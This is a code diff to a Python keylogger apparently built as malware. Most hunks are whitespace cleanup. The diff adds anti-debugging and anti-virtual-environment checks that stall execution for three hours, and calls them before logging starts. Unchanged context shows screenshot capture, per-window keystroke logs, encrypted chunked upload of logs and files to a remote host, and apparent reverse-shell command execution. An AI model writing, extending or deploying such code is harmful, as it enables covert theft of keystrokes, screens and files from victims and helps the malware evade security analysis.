@@ -115,7 +115,7 @@ class Keylogger:
     def screenshot(self):
         if not os.path.exists(self.log_directory):
             os.makedirs(self.log_directory)
-    
+
         filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
         pyautogui.screenshot(os.path.join(self.log_directory, filename))
 
@@ -131,7 +131,7 @@ class Keylogger:
                 self.connected = False
                 logging.debug(err)
                 time.sleep(self.reconnect_interval)
-                
+
     def encrypt_and_send(self, data: bytes):
         encrypted_data = utils.encrypt(data)
         while True:
@@ -145,7 +145,7 @@ class Keylogger:
 
     def send_header_to_server(self, number_of_chunks, filename, number_of_files_left):
         header = "__".join([number_of_chunks, filename, number_of_files_left]).encode(utils.ENCODING)
-        self.encrypt_and_send(header)        
+        self.encrypt_and_send(header)
 
     def send_message_to_server(self, data: str):
         chunk_size = utils.BUFFSIZE-96
@@ -153,11 +153,11 @@ class Keylogger:
         chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one
 
         self.send_header_to_server(str(len(chunks)), "", "")
-        
+
         for chunk in chunks:
             self.encrypt_and_send(chunk)
             time.sleep(0.005)
-            
+
     def send_files_to_server(self, files: list):
         chunk_size = utils.BUFFSIZE-96
         number_of_files = len(files)
@@ -169,8 +169,8 @@ class Keylogger:
             number_of_chunks = str(len(chunks))
             filename = os.path.split(file)[1]
             number_of_files_left = str(number_of_files-index-1)
-            
-            self.send_header_to_server(number_of_chunks,filename,number_of_files_left)            
+
+            self.send_header_to_server(number_of_chunks,filename,number_of_files_left)
 
             for chunk in chunks:
                 self.encrypt_and_send(chunk)
@@ -201,15 +201,26 @@ class Keylogger:
 
                 elif (self.end_time - self.start_time) >= timedelta(seconds=self.log_interval):
                     self.write_keylogs_to_file(current_window)
-                    self.filecounter += 1                    
+                    self.filecounter += 1
                     self.start_time = datetime.now()
 
             time.sleep(self.window_interval)
 
+
+#--------------- Anti-analysis-techniques----------#
+    def anti_debug(self):
+        debugger_is_present = windll.kernel32.IsDebuggerPresent()
+        if debugger_is_present:
+            time.sleep(10800)#3 Stunden
+
+    def anti_vm(self):
+        if sys.prefix != sys.base_prefix:
+            time.sleep(10800)
+
 #--------------- START / STOP ---------------#
     def activate(self):
         self.active = True
-    
+
     def deactivate(self):
         self.active = False
 
@@ -257,6 +268,8 @@ def execute_command(command:str) -> str:
 if __name__ == "__main__":
     reverse_shell_active = False
     keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
+    keylogger.anti_debug()
+    keylogger.anti_vm()
     keylogger.start()
     keylogger.connect_to_host()
 
